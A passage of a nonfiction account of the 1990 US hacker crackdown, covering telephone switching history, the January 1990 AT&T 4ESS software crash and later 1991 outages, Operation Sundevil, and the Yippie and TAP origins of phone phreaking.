when not actively hostile to telco interests.  There's a loss of morale, a deep sensation of having somehow lost the upper hand.  Technological change has caused a loss of data and revenue to other, newer forms of transmission. There's theft, and new forms of theft, of growing scale and boldness and sophistication.  With all these factors, it was no surprise to see the telcos, large and small, break out in a litany of bitter complaint.    In late '88 and throughout 1989, telco representatives grew shrill in their complaints to those few American law enforcement officials who make it their business to try to understand what telephone people are talking about.  Telco security officials had discovered the computer hacker underground, infiltrated it thoroughly, and become deeply alarmed at its growing expertise.  Here they had found a target that was not only loathsome on its face, but clearly ripe for counterattack.     Those bitter rivals  AT T, MCI and Sprint  and a crowd of Baby Bells   PacBell, Bell South, Southwestern Bell, NYNEX, USWest, as well as the Bell research consortium Bellcore, and the independent long distance carrier Mid American  all were to have their role in the great hacker dragnet of 1990.  After years of being battered and pushed around, the telcos had, at least in a small way, seized the initiative again.  After years of turmoil, telcos and government officials were once again to work smoothly in concert in defense of the System.  Optimism blossomed  enthusiasm grew on all sides  the prospective taste of vengeance was sweet.       From the beginning  even before the crackdown had a name   secrecy was a big problem.  There were many good reasons for secrecy in the hacker crackdown.  Hackers and code thieves were wily prey, slinking back to their bedrooms and basements and destroying vital incriminating evidence at the first hint of trouble.  Furthermore, the crimes themselves were heavily technical and difficult to describe, even to police  much less to the general public.    When such crimes HAD been described intelligibly to the public, in the past, that very publicity had tended to INCREASE the crimes enormously.  Telco officials, while painfully aware of the vulnerabilities of their systems, were anxious not to publicize those weaknesses.  Experience showed them that those weaknesses, once discovered, would be pitilessly exploited by tens of thousands of people  not only by professional grifters and by underground hackers and phone phreaks, but by many otherwise more or less honest everyday folks, who regarded stealing service from the faceless, soulless  Phone Company  as a kind of harmless indoor sport.  When it came to protecting their interests, telcos had long since given up on general public sympathy for  the Voice with a Smile.   Nowadays the telco's  Voice  was very likely to be a computer's  and the American public showed much less of the proper respect and gratitude due the fine public service bequeathed them by Dr. Bell and Mr. Vail. The more efficient, high tech, computerized, and impersonal the telcos became, it seemed, the more they were met by sullen public resentment and amoral greed.    Telco officials wanted to punish the phone phreak underground, in as public and exemplary a manner as possible. They wanted to make dire examples of the worst offenders, to seize the ringleaders and intimidate the small fry, to discourage and frighten the wacky hobbyists, and send the professional grifters to jail.  To do all this, publicity was vital.    Yet operational secrecy was even more so.  If word got out that a nationwide crackdown was coming, the hackers might simply vanish  destroy the evidence, hide their computers, go to earth, and wait for the campaign to blow over.  Even the young hackers were crafty and suspicious, and as for the professional grifters, they tended to split for the nearest state line at the first sign of trouble.  For the crackdown to work well, they would all have to be caught red handed, swept upon suddenly, out of the blue, from every corner of the compass.    And there was another strong motive for secrecy.  In the worst case scenario, a blown campaign might leave the telcos open to a devastating hacker counter attack.  If there were indeed hackers loose in America who had caused the January 15 Crash  if there were truly gifted hackers, loose in the nation's long  distance switching systems, and enraged or frightened by the crackdown  then they might react unpredictably to an attempt to collar them.  Even if caught, they might have talented and vengeful friends still running around loose.  Conceivably, it could turn ugly.  Very ugly.  In fact, it was hard to imagine just how ugly things might turn, given that possibility.    Counter attack from hackers was a genuine concern for the telcos.  In point of fact, they would never suffer any such counter attack.  But in months to come, they would be at some pains to publicize this notion and to utter grim warnings about it.    Still, that risk seemed well worth running.  Better to run the risk of vengeful attacks, than to live at the mercy of potential crashers.  Any cop would tell you that a protection racket had no real future.     And publicity was such a useful thing.  Corporate security officers, including telco security, generally work under conditions of great discretion.  And corporate security officials do not make money for their companies. Their job is to PREVENT THE LOSS of money, which is much less glamorous than actually winning profits.    If you are a corporate security official, and you do your job brilliantly, then nothing bad happens to your company at all. Because of this, you appear completely superfluous.  This is one of the many unattractive aspects of security work.  It's rare that these folks have the chance to draw some healthy attention to their own efforts.    Publicity also served the interest of their friends in law enforcement.  Public officials, including law enforcement officials, thrive by attracting favorable public interest.  A brilliant prosecution in a matter of vital public interest can make the career of a prosecuting attorney.  And for a police officer, good publicity opens the purses of the legislature  it may bring a citation, or a promotion, or at least a rise in status and the respect of one's peers.    But to have both publicity and secrecy is to have one's cake and eat it too.  In months to come, as we will show, this impossible act was to cause great pain to the agents of the crackdown.  But early on, it seemed possible  maybe even likely   that the crackdown could successfully combine the best of both worlds.  The ARREST of hackers would be heavily publicized.  The actual DEEDS of the hackers, which were technically hard to explain and also a security risk, would be left decently obscured.  The THREAT hackers posed would be heavily trumpeted  the likelihood of their actually committing such fearsome crimes would be left to the public's imagination.  The spread of the computer underground, and its growing technical sophistication, would be heavily promoted  the actual hackers themselves, mostly bespectacled middle class white suburban teenagers, would be denied any personal publicity.    It does not seem to have occurred to any telco official that the hackers accused would demand a day in court  that journalists would smile upon the hackers as  good copy    that wealthy high tech entrepreneurs would offer moral and financial support to crackdown victims  that constitutional lawyers would show up with briefcases, frowning mightily.  This possibility does not seem to have ever entered the game plan.    And even if it had, it probably would not have slowed the ferocious pursuit of a stolen phone company document, mellifluously known as  Control Office Administration of Enhanced 911 Services for Special Services and Major Account Centers.     In the chapters to follow, we will explore the worlds of police and the computer underground, and the large shadowy area where they overlap.  But first, we must explore the battleground. Before we leave the world of the telcos, we must understand what a switching system actually is and how your telephone actually works.       To the average citizen, the idea of the telephone is represented by, well, a TELEPHONE   a device that you talk into. To a telco professional, however, the telephone itself is known, in lordly fashion, as a  subset.   The  subset  in your house is a mere adjunct, a distant nerve ending, of the central switching stations, which are ranked in levels of hierarchy, up to the long distance electronic switching stations, which are some of the largest computers on earth.    Let us imagine that it is, say, 1925, before the introduction of computers, when the phone system was simpler and somewhat easier to grasp.  Let's further imagine that you are Miss Leticia Luthor, a fictional operator for Ma Bell in New York City of the 20s.    Basically, you, Miss Luthor, ARE the  switching system.  You are sitting in front of a large vertical switchboard, known as a  cordboard,  made of shiny wooden panels, with ten thousand metal rimmed holes punched in them, known as jacks.  The engineers would have put more holes into your switchboard, but ten thousand is as many as you can reach without actually having to get up out of your chair.     Each of these ten thousand holes has its own little electric lightbulb, known as a  lamp,  and its own neatly printed number code.     With the ease of long habit, you are scanning your board for lit up bulbs.  This is what you do most of the time, so you are used to it.    A lamp lights up.  This means that the phone at the end of that line has been taken off the hook.  Whenever a handset is taken off the hook, that closes a circuit inside the phone which then signals the local office, i.e. you, automatically.  There might be somebody calling, or then again the phone might be simply off the hook, but this does not matter to you yet.  The first thing you do, is record that number in your logbook, in your fine American public school handwriting.  This comes first, naturally, since it is done for billing purposes.    You now take the plug of your answering cord, which goes directly to your headset, and plug it into the lit up hole.  Operator,  you announce.    In operator's classes, before taking this job, you have been issued a large pamphlet full of canned operator's responses for all kinds of contingencies, which you had to memorize.  You have also been trained in a proper non regional, non ethnic pronunciation and tone of voice.  You rarely have the occasion to make any spontaneous remark to a customer, and in fact this is frowned upon  except out on the rural lines where people have time on their hands and get up to all kinds of mischief .    A tough sounding user's voice at the end of the line gives you a number.  Immediately, you write that number down in your logbook, next to the caller's number, which you just wrote earlier.  You then look and see if the number this guy wants is in fact on your switchboard, which it generally is, since it's generally a local call.  Long distance costs so much that people use it sparingly.    Only then do you pick up a calling cord from a shelf at the base of the switchboard.  This is a long elastic cord mounted on a kind of reel so that it will zip back in when you unplug it. There are a lot of cords down there, and when a bunch of them are out at once they look like a nest of snakes.  Some of the girls think there are bugs living in those cable holes.  They're called  cable mites  and are supposed to bite your hands and give you rashes.  You don't believe this, yourself.    Gripping the head of your calling cord, you slip the tip of it deftly into the sleeve of the jack for the called person. Not all the way in, though.  You just touch it.  If you hear a clicking sound, that means the line is busy and you can't put the call through.  If the line is busy, you have to stick the calling cord into a  busy tone jack,  which will give the guy a busy tone.  This way you don't have to talk to him yourself and absorb his natural human frustration.    But the line isn't busy.  So you pop the cord all the way in.  Relay circuits in your board make the distant phone ring, and if somebody picks it up off the hook, then a phone conversation starts.  You can hear this conversation on your answering cord, until you unplug it.  In fact you could listen to the whole conversation if you wanted, but this is sternly frowned upon by management, and frankly, when you've overheard one, you've pretty much heard 'em all.    You can tell how long the conversation lasts by the glow of the calling cord's lamp, down on the calling cord's shelf. When it's over, you unplug and the calling cord zips back into place.    Having done this stuff a few hundred thousand times, you become quite good at it.  In fact you're plugging, and connecting, and disconnecting, ten, twenty, forty cords at a time.  It's a manual handicraft, really, quite satisfying in a way, rather like weaving on an upright loom.    Should a long distance call come up, it would be different, but not all that different.  Instead of connecting the call through your own local switchboard, you have to go up the hierarchy, onto the long distance lines, known as  trunklines.  Depending on how far the call goes, it may have to work its way through a whole series of operators, which can take quite a while.  The caller doesn't wait on the line while this complex process is negotiated across the country by the gaggle of operators.  Instead, the caller hangs up, and you call him back yourself when the call has finally worked its way through.    After four or five years of this work, you get married, and you have to quit your job, this being the natural order of womanhood in the American 1920s.  The phone company has to train somebody else  maybe two people, since the phone system has grown somewhat in the meantime.  And this costs money.    In fact, to use any kind of human being as a switching system is a very expensive proposition.  Eight thousand Leticia Luthors would be bad enough, but a quarter of a million of them is a military scale proposition and makes drastic measures in automation financially worthwhile.    Although the phone system continues to grow today, the number of human beings employed by telcos has been dropping steadily for years.  Phone  operators  now deal with nothing but unusual contingencies, all routine operations having been shrugged off onto machines.  Consequently, telephone operators are considerably less machine like nowadays, and have been known to have accents and actual character in their voices.  When you reach a human operator today, the operators are rather more  human  than they were in Leticia's day  but on the other hand, human beings in the phone system are much harder to reach in the first place.    Over the first half of the twentieth century,  electromechanical  switching systems of growing complexity were cautiously introduced into the phone system.  In certain backwaters, some of these hybrid systems are still in use.  But after 1965, the phone system began to go completely electronic, and this is by far the dominant mode today.  Electromechanical systems have  crossbars,  and  brushes,  and other large moving mechanical parts, which, while faster and cheaper than Leticia, are still slow, and tend to wear out fairly quickly.    But fully electronic systems are inscribed on silicon chips, and are lightning fast, very cheap, and quite durable. They are much cheaper to maintain than even the best electromechanical systems, and they fit into half the space.  And with every year, the silicon chip grows smaller, faster, and cheaper yet.  Best of all, automated electronics work around the clock and don't have salaries or health insurance.    There are, however, quite serious drawbacks to the use of computer chips.  When they do break down, it is a daunting challenge to figure out what the heck has gone wrong with them. A broken cordboard generally had a problem in it big enough to see.  A broken chip has invisible, microscopic faults.  And the faults in bad software can be so subtle as to be practically theological.    If you want a mechanical system to do something new, then you must travel to where it is, and pull pieces out of it, and wire in new pieces.  This costs money.  However, if you want a chip to do something new, all you have to do is change its software, which is easy, fast and dirt cheap.  You don't even have to see the chip to change its program.  Even if you did see the chip, it wouldn't look like much.  A chip with program X doesn't look one whit different from a chip with program Y.    With the proper codes and sequences, and access to specialized phone lines, you can change electronic switching systems all over America from anywhere you please.    And so can other people.  If they know how, and if they want to, they can sneak into a microchip via the special phonelines and diddle with it, leaving no physical trace at all. If they broke into the operator's station and held Leticia at gunpoint, that would be very obvious.  If they broke into a telco building and went after an electromechanical switch with a toolbelt, that would at least leave many traces.  But people can do all manner of amazing things to computer switches just by typing on a keyboard, and keyboards are everywhere today.  The extent of this vulnerability is deep, dark, broad, almost mind  boggling, and yet this is a basic, primal fact of life about any computer on a network.    Security experts over the past twenty years have insisted, with growing urgency, that this basic vulnerability of computers represents an entirely new level of risk, of unknown but obviously dire potential to society.  And they are right.    An electronic switching station does pretty much everything Letitia did, except in nanoseconds and on a much larger scale.  Compared to Miss Luthor's ten thousand jacks, even a primitive 1ESS switching computer, 60s vintage, has a 128,000 lines.  And the current AT T system of choice is the monstrous fifth generation 5ESS.    An Electronic Switching Station can scan every line on its  board  in a tenth of a second, and it does this over and over, tirelessly, around the clock.  Instead of eyes, it uses  ferrod scanners  to check the condition of local lines and trunks.  Instead of hands, it has  signal distributors,   central pulse distributors,   magnetic latching relays,  and  reed switches,  which complete and break the calls.  Instead of a brain, it has a  central processor.   Instead of an instruction manual, it has a program.  Instead of a handwritten logbook for recording and billing calls, it has magnetic tapes. And it never has to talk to anybody.  Everything a customer might say to it is done by punching the direct dial tone buttons on your subset.    Although an Electronic Switching Station can't talk, it does need an interface, some way to relate to its, er, employers. This interface is known as the  master control center.    This interface might be better known simply as  the interface,  since it doesn't actually  control  phone calls directly.  However, a term like  Master Control Center  is just the kind of rhetoric that telco maintenance engineers  and hackers  find particularly satisfying.     Using the master control center, a phone engineer can test local and trunk lines for malfunctions.  He  rarely she  can check various alarm displays, measure traffic on the lines, examine the records of telephone usage and the charges for those calls, and change the programming.    And, of course, anybody else who gets into the master control center by remote control can also do these things, if he  rarely she  has managed to figure them out, or, more likely, has somehow swiped the knowledge from people who already know.    In 1989 and 1990, one particular RBOC, BellSouth, which felt particularly troubled, spent a purported  1.2 million on computer security.  Some think it spent as much as two million, if you count all the associated costs.  Two million dollars is still very little compared to the great cost saving utility of telephonic computer systems.    Unfortunately, computers are also stupid.  Unlike human beings, computers possess the truly profound stupidity of the inanimate.    In the 1960s, in the first shocks of spreading computerization, there was much easy talk about the stupidity of computers  how they could  only follow the program  and were rigidly required to do  only what they were told.   There has been rather less talk about the stupidity of computers since they began to achieve grandmaster status in chess tournaments, and to manifest many other impressive forms of apparent cleverness.    Nevertheless, computers STILL are profoundly brittle and stupid  they are simply vastly more subtle in their stupidity and brittleness.  The computers of the 1990s are much more reliable in their components than earlier computer systems, but they are also called upon to do far more complex things, under far more challenging conditions.    On a basic mathematical level, every single line of a software program offers a chance for some possible screwup. Software does not sit still when it works  it  runs,  it interacts with itself and with its own inputs and outputs.  By analogy, it stretches like putty into millions of possible shapes and conditions, so many shapes that they can never all be successfully tested, not even in the lifespan of the universe. Sometimes the putty snaps.    The stuff we call  software  is not like anything that human society is used to thinking about.  Software is something like a machine, and something like mathematics, and something like language, and something like thought, and art, and information.... but software is not in fact any of those other things.  The protean quality of software is one of the great sources of its fascination.  It also makes software very powerful, very subtle, very unpredictable, and very risky.    Some software is bad and buggy.  Some is  robust,  even  bulletproof.   The best software is that which has been tested by thousands of users under thousands of different conditions, over years.  It is then known as  stable.   This does NOT mean that the software is now flawless, free of bugs.  It generally means that there are plenty of bugs in it, but the bugs are well  identified and fairly well understood.    There is simply no way to assure that software is free of flaws.  Though software is mathematical in nature, it cannot by  proven  like a mathematical theorem  software is more like language, with inherent ambiguities, with different definitions, different assumptions, different levels of meaning that can conflict.    Human beings can manage, more or less, with human language because we can catch the gist of it.    Computers, despite years of effort in  artificial intelligence,  have proven spectacularly bad in  catching the gist  of anything at all.  The tiniest bit of semantic grit may still bring the mightiest computer tumbling down.  One of the most hazardous things you can do to a computer program is try to improve it  to try to make it safer.  Software  patches  represent new, untried un  stable  software, which is by definition riskier.    The modern telephone system has come to depend, utterly and irretrievably, upon software.  And the System Crash of January 15, 1990, was caused by an IMPROVEMENT in software.  Or rather, an ATTEMPTED improvement.    As it happened, the problem itself  the problem per se    took this form.  A piece of telco software had been written in C language, a standard language of the telco field.  Within the C software was a long  do... while  construct.  The  do... while  construct contained a  switch  statement.  The  switch  statement contained an  if  clause.  The  if  clause contained a  break.  The  break  was SUPPOSED to  break  the  if clause.   Instead, the  break  broke the  switch  statement.    That was the problem, the actual reason why people picking up phones on January 15, 1990, could not talk to one another.    Or at least, that was the subtle, abstract, cyberspatial seed of the problem.  This is how the problem manifested itself from the realm of programming into the realm of real life.    The System 7 software for AT T's 4ESS switching station, the  Generic 44E14 Central Office Switch Software,  had been extensively tested, and was considered very stable.  By the end of 1989, eighty of AT T's switching systems nationwide had been programmed with the new software.  Cautiously, thirty four stations were left to run the slower, less capable System 6, because AT T suspected there might be shakedown problems with the new and unprecedently sophisticated System 7 network.    The stations with System 7 were programmed to switch over to a backup net in case of any problems.  In mid December 1989, however, a new high velocity, high security software patch was distributed to each of the 4ESS switches that would enable them to switch over even more quickly, making the System 7 network that much more secure.    Unfortunately, every one of these 4ESS switches was now in possession of a small but deadly flaw.    In order to maintain the network, switches must monitor the condition of other switches  whether they are up and running, whether they have temporarily shut down, whether they are overloaded and in need of assistance, and so forth.  The new software helped control this bookkeeping function by monitoring the status calls from other switches.    It only takes four to six seconds for a troubled 4ESS switch to rid itself of all its calls, drop everything temporarily, and re boot its software from scratch.  Starting over from scratch will generally rid the switch of any software problems that may have developed in the course of running the system.  Bugs that arise will be simply wiped out by this process.  It is a clever idea.  This process of automatically re  booting from scratch is known as the  normal fault recovery routine.   Since AT T's software is in fact exceptionally stable, systems rarely have to go into  fault recovery  in the first place  but AT T has always boasted of its  real world  reliability, and this tactic is a belt and suspenders routine.    The 4ESS switch used its new software to monitor its fellow switches as they recovered from faults.  As other switches came back on line after recovery, they would send their  OK  signals to the switch.  The switch would make a little note to that effect in its  status map,  recognizing that the fellow switch was back and ready to go, and should be sent some calls and put back to regular work.    Unfortunately, while it was busy bookkeeping with the status map, the tiny flaw in the brand new software came into play.  The flaw caused the 4ESS switch to interacted, subtly but drastically, with incoming telephone calls from human users. If  and only if  two incoming phone calls happened to hit the switch within a hundredth of a second, then a small patch of data would be garbled by the flaw.    But the switch had been programmed to monitor itself constantly for any possible damage to its data.  When the switch perceived that its data had been somehow garbled, then it too would go down, for swift repairs to its software.  It would signal its fellow switches not to send any more work.  It would go into the fault recovery mode for four to six seconds.  And then the switch would be fine again, and would send out its  OK, ready for work  signal.    However, the  OK, ready for work  signal was the VERY THING THAT CAUSED THE SWITCH TO GO DOWN IN THE FIRST PLACE.  And ALL the System 7 switches had the same flaw in their status map software.  As soon as they stopped to make the bookkeeping note that their fellow switch was  OK,  then they too would become vulnerable to the slight chance that two phone calls would hit them within a hundredth of a second.    At approximately 2 25 p.m. EST on Monday, January 15, one of AT T's 4ESS toll switching systems in New York City had an actual, legitimate, minor problem.  It went into fault recovery routines, announced  I'm going down,  then announced,  I'm back, I'm OK.   And this cheery message then blasted throughout the network to many of its fellow 4ESS switches.    Many of the switches, at first, completely escaped trouble.  These lucky switches were not hit by the coincidence of two phone calls within a hundredth of a second.  Their software did not fail  at first.  But three switches  in Atlanta, St. Louis, and Detroit  were unlucky, and were caught with their hands full.  And they went down.  And they came back up, almost immediately.  And they too began to broadcast the lethal message that they, too, were  OK  again, activating the lurking software bug in yet other switches.    As more and more switches did have that bit of bad luck and collapsed, the call traffic became more and more densely packed in the remaining switches, which were groaning to keep up with the load.  And of course, as the calls became more densely packed, the switches were MUCH MORE LIKELY to be hit twice within a hundredth of a second.    It only took four seconds for a switch to get well. There was no PHYSICAL damage of any kind to the switches, after all.  Physically, they were working perfectly.  This situation was  only  a software problem.    But the 4ESS switches were leaping up and down every four to six seconds, in a virulent spreading wave all over America, in utter, manic, mechanical stupidity.  They kept KNOCKING one another down with their contagious  OK  messages.    It took about ten minutes for the chain reaction to cripple the network.  Even then, switches would periodically luck out and manage to resume their normal work.  Many calls   millions of them  were managing to get through.  But millions weren't.    The switching stations that used System 6 were not directly affected.  Thanks to these old fashioned switches, AT T's national system avoided complete collapse.  This fact also made it clear to engineers that System 7 was at fault.    Bell Labs engineers, working feverishly in New Jersey, Illinois, and Ohio, first tried their entire repertoire of standard network remedies on the malfunctioning System 7.  None of the remedies worked, of course, because nothing like this had ever happened to any phone system before.    By cutting out the backup safety network entirely, they were able to reduce the frenzy of  OK  messages by about half. The system then began to recover, as the chain reaction slowed. By 11 30 pm on Monday January 15, sweating engineers on the midnight shift breathed a sigh of relief as the last switch cleared up.    By Tuesday they were pulling all the brand new 4ESS software and replacing it with an earlier version of System 7.    If these had been human operators, rather than computers at work, someone would simply have eventually stopped screaming. It would have been OBVIOUS that the situation was not  OK,  and common sense would have kicked in.  Humans possess common sense   at least to some extent.  Computers simply don't.    On the other hand, computers can handle hundreds of calls per second.  Humans simply can't.  If every single human being in America worked for the phone company, we couldn't match the performance of digital switches   direct dialling, three way calling, speed calling, call waiting, Caller ID, all the rest of the cornucopia of digital bounty.  Replacing computers with operators is simply not an option any more.    And yet we still, anachronistically, expect humans to be running our phone system.  It is hard for us to understand that we have sacrificed huge amounts of initiative and control to senseless yet powerful machines.  When the phones fail, we want somebody to be responsible.  We want somebody to blame.    When the Crash of January 15 happened, the American populace was simply not prepared to understand that enormous landslides in cyberspace, like the Crash itself, can happen, and can be nobody's fault in particular.  It was easier to believe, maybe even in some odd way more reassuring to believe, that some evil person, or evil group, had done this to us.   Hackers  had done it.  With a virus.  A trojan horse.  A software bomb.  A dirty plot of some kind.  People believed this, responsible people.  In 1990, they were looking hard for evidence to confirm their heartfelt suspicions.    And they would look in a lot of places.    Come 1991, however, the outlines of an apparent new reality would begin to emerge from the fog.    On July 1 and 2, 1991, computer software collapses in telephone switching stations disrupted service in Washington DC, Pittsburgh, Los Angeles and San Francisco.  Once again, seemingly minor maintenance problems had crippled the digital System 7. About twelve million people were affected in the Crash of July 1, 1991.    Said the New York Times Service    Telephone company executives and federal regulators said they were not ruling out the possibility of sabotage by computer hackers, but most seemed to think the problems stemmed from some unknown defect in the software running the networks.     And sure enough, within the week, a red faced software company, DSC Communications Corporation of Plano, Texas, owned up to  glitches  in the  signal transfer point  software that DSC had designed for Bell Atlantic and Pacific Bell.  The immediate cause of the July 1 Crash was a single mistyped character   one tiny typographical flaw in one single line of the software.  One mistyped letter, in one single line, had deprived the nation's capital of phone service.  It was not particularly surprising that this tiny flaw had escaped attention  a typical System 7 station requires TEN MILLION lines of code.    On Tuesday, September 17, 1991, came the most spectacular outage yet.  This case had nothing to do with software failures   at least, not directly.  Instead, a group of AT T's switching stations in New York City had simply run out of electrical power and shut down cold.  Their back up batteries had failed. Automatic warning systems were supposed to warn of the loss of battery power, but those automatic systems had failed as well.    This time, Kennedy, La Guardia, and Newark airports all had their voice and data communications cut.  This horrifying event was particularly ironic, as attacks on airport computers by hackers had long been a standard nightmare scenario, much trumpeted by computer security experts who feared the computer underground.  There had even been a Hollywood thriller about sinister hackers ruining airport computers  DIE HARD II. Now AT T itself had crippled airports with computer malfunctions  not just one airport, but three at once, some of the busiest in the world.    Air traffic came to a standstill throughout the Greater New York area, causing more than 500 flights to be cancelled, in a spreading wave all over America and even into Europe.  Another 500 or so flights were delayed, affecting, all in all, about 85,000 passengers.   One of these passengers was the chairman of the Federal Communications Commission.     Stranded passengers in New York and New Jersey were further infuriated to discover that they could not even manage to make a long distance phone call, to explain their delay to loved ones or business associates.  Thanks to the crash, about four and a half million domestic calls, and half a million international calls, failed to get through.    The September 17 NYC Crash, unlike the previous ones, involved not a whisper of  hacker  misdeeds.  On the contrary, by 1991, AT T itself was suffering much of the vilification that had formerly been directed at hackers.  Congressmen were grumbling. So were state and federal regulators.  And so was the press.    For their part, ancient rival MCI took out snide full  page newspaper ads in New York, offering their own long distance services for the  next time that AT T goes down.      You wouldn't find a classy company like AT T using such advertising,  protested AT T Chairman Robert Allen, unconvincingly.  Once again, out came the full page AT T apologies in newspapers, apologies for  an inexcusable culmination of both human and mechanical failure.    This time, however, AT T offered no discount on later calls.  Unkind critics suggested that AT T were worried about setting any precedent for refunding the financial losses caused by telephone crashes.     Industry journals asked publicly if AT T was  asleep at the switch.   The telephone network, America's purported marvel of high tech reliability, had gone down three times in 18 months. FORTUNE magazine listed the Crash of September 17 among the  Biggest Business Goofs of 1991,  cruelly parodying AT T's ad campaign in an article entitled  AT T Wants You Back  Safely On the Ground, God Willing .     Why had those New York switching systems simply run out of power   Because no human being had attended to the alarm system.  Why did the alarm systems blare automatically, without any human being noticing   Because the three telco technicians who SHOULD have been listening were absent from their stations in the power room, on another floor of the building  attending a training class.  A training class about the alarm systems for the power room!     Crashing the System  was no longer  unprecedented  by late 1991.  On the contrary, it no longer even seemed an oddity. By 1991, it was clear that all the policemen in the world could no longer  protect  the phone system from crashes.  By far the worst crashes the system had ever had, had been inflicted, by the system, upon ITSELF.  And this time nobody was making cocksure statements that this was an anomaly, something that would never happen again.  By 1991 the System's defenders had met their nebulous Enemy, and the Enemy was  the System.      PART TWO   THE DIGITAL UNDERGROUND     The date was May 9, 1990.  The Pope was touring Mexico City.  Hustlers from the Medellin Cartel were trying to buy black market Stinger missiles in Florida.  On the comics page, Doonesbury character Andy was dying of AIDS.  And then.... a highly unusual item whose novelty and calculated rhetoric won it headscratching attention in newspapers all over America.    The US Attorney's office in Phoenix, Arizona, had issued a press release announcing a nationwide law enforcement crackdown against  illegal computer hacking activities.   The sweep was officially known as  Operation Sundevil.     Eight paragraphs in the press release gave the bare facts   twenty seven search warrants carried out on May 8, with three arrests, and a hundred and fifty agents on the prowl in  twelve  cities across America.   Different counts in local press reports yielded  thirteen,   fourteen,  and  sixteen  cities.  Officials estimated that criminal losses of revenue to telephone companies  may run into millions of dollars.   Credit for the Sundevil investigations was taken by the US Secret Service, Assistant US Attorney Tim Holtzen of Phoenix, and the Assistant Attorney General of Arizona, Gail Thackeray.    The prepared remarks of Garry M. Jenkins, appearing in a U.S. Department of Justice press release, were of particular interest.  Mr. Jenkins was the Assistant Director of the US Secret Service, and the highest ranking federal official to take any direct public role in the hacker crackdown of 1990.       Today, the Secret Service is sending a clear message to those computer hackers who have decided to violate the laws of this nation in the mistaken belief that they can successfully avoid detection by hiding behind the relative anonymity of their computer terminals. ...      Underground groups have been formed for the purpose of exchanging information relevant to their criminal activities. These groups often communicate with each other through message systems between computers called 'bulletin boards.'     Our experience shows that many computer hacker suspects are no longer misguided teenagers, mischievously playing games with their computers in their bedrooms.  Some are now high tech computer operators using computers to engage in unlawful conduct.       Who were these  underground groups  and  high tech operators    Where had they come from   What did they want   Who WERE they   Were they  mischievous    Were they dangerous   How had  misguided teenagers  managed to alarm the United States Secret Service   And just how widespread was this sort of thing     Of all the major players in the Hacker Crackdown   the phone companies, law enforcement, the civil libertarians, and the  hackers  themselves  the  hackers  are by far the most mysterious, by far the hardest to understand, by far the WEIRDEST.    Not only are  hackers  novel in their activities, but they come in a variety of odd subcultures, with a variety of languages, motives and values.    The earliest proto hackers were probably those unsung mischievous telegraph boys who were summarily fired by the Bell Company in 1878.    Legitimate  hackers,  those computer enthusiasts who are independent minded but law abiding, generally trace their spiritual ancestry to elite technical universities, especially M.I.T. and Stanford, in the 1960s.    But the genuine roots of the modern hacker UNDERGROUND can probably be traced most successfully to a now much obscured hippie anarchist movement known as the Yippies.  The Yippies, who took their name from the largely fictional  Youth International Party,  carried out a loud and lively policy of surrealistic subversion and outrageous political mischief.  Their basic tenets were flagrant sexual promiscuity, open and copious drug use, the political overthrow of any powermonger over thirty years of age, and an immediate end to the war in Vietnam, by any means necessary, including the psychic levitation of the Pentagon.    The two most visible Yippies were Abbie Hoffman and Jerry Rubin.  Rubin eventually became a Wall Street broker.  Hoffman, ardently sought by federal authorities, went into hiding for seven years, in Mexico, France, and the United States.  While on the lam, Hoffman continued to write and publish, with help from sympathizers in the American anarcho leftist underground. Mostly, Hoffman survived through false ID and odd jobs. Eventually he underwent facial plastic surgery and adopted an entirely new identity as one  Barry Freed.   After surrendering himself to authorities in 1980, Hoffman spent a year in prison on a cocaine conviction.    Hoffman's worldview grew much darker as the glory days of the 1960s faded.  In 1989, he purportedly committed suicide, under odd and, to some, rather suspicious circumstances.    Abbie Hoffman is said to have caused the Federal Bureau of Investigation to amass the single largest investigation file ever opened on an individual American citizen.   If this is true, it is still questionable whether the FBI regarded Abbie Hoffman a serious public threat  quite possibly, his file was enormous simply because Hoffman left colorful legendry wherever he went . He was a gifted publicist, who regarded electronic media as both playground and weapon.  He actively enjoyed manipulating network TV and other gullible, image hungry media, with various weird lies, mindboggling rumors, impersonation scams, and other sinister distortions, all absolutely guaranteed to upset cops, Presidential candidates, and federal judges.  Hoffman's most famous work was a book self reflexively known as STEAL THIS BOOK, which publicized a number of methods by which young, penniless hippie agitators might live off the fat of a system supported by humorless drones.  STEAL THIS BOOK, whose title urged readers to damage the very means of distribution which had put it into their hands, might be described as a spiritual ancestor of a computer virus.    Hoffman, like many a later conspirator, made extensive use of pay phones for his agitation work  in his case, generally through the use of cheap brass washers as coin slugs.    During the Vietnam War, there was a federal surtax imposed on telephone service  Hoffman and his cohorts could, and did, argue that in systematically stealing phone service they were engaging in civil disobedience   virtuously denying tax funds to an illegal and immoral war.    But this thin veil of decency was soon dropped entirely. Ripping off the System found its own justification in deep alienation and a basic outlaw contempt for conventional bourgeois values.  Ingenious, vaguely politicized varieties of rip off, which might be described as  anarchy by convenience,  became very popular in Yippie circles, and because rip off was so useful, it was to survive the Yippie movement itself.    In the early 1970s, it required fairly limited expertise and ingenuity to cheat payphones, to divert  free  electricity and gas service, or to rob vending machines and parking meters for handy pocket change.  It also required a conspiracy to spread this knowledge, and the gall and nerve actually to commit petty theft, but the Yippies had these qualifications in plenty.  In June 1971, Abbie Hoffman and a telephone enthusiast sarcastically known as  Al Bell  began publishing a newsletter called YOUTH INTERNATIONAL PARTY LINE.  This newsletter was dedicated to collating and spreading Yippie rip off techniques, especially of phones, to the joy of the freewheeling underground and the insensate rage of all straight people.    As a political tactic, phone service theft ensured that Yippie advocates would always have ready access to the long  distance telephone as a medium, despite the Yippies' chronic lack of organization, discipline, money, or even a steady home address.    PARTY LINE was run out of Greenwich Village for a couple of years, then  Al Bell  more or less defected from the faltering ranks of Yippiedom, changing the newsletter's name to _TAP_ or TECHNICAL ASSISTANCE PROGRAM.  After the Vietnam War ended, the steam began leaking rapidly out of American radical dissent.  But by this time,  Bell  and his dozen or so core contributors had the bit between their teeth, and had begun to derive tremendous gut level satisfaction from the sensation of pure TECHNICAL POWER.    _TAP_ articles, once highly politicized, became pitilessly jargonized and technical, in homage or parody to the Bell System's own technical documents, which _TAP_ studied closely, gutted, and reproduced without permission.  The _TAP_ elite revelled in gloating possession of the specialized knowledge necessary to beat the system.     Al Bell  dropped out of the game by the late 70s, and  Tom Edison  took over  TAP readers  some 1400 of them, all told  now began to show more interest in telex switches and the growing phenomenon of computer systems.    In 1983,  Tom Edison  had his computer stolen and his house set on fire by an arsonist.  This was an eventually mortal blow to _TAP_  though the legendary name was to be resurrected in 1990 by a young Kentuckian computer outlaw named  Predat0r.         Ever since telephones began to make money, there have been people willing to rob and defraud phone companies.  The legions of petty phone thieves vastly outnumber those  phone 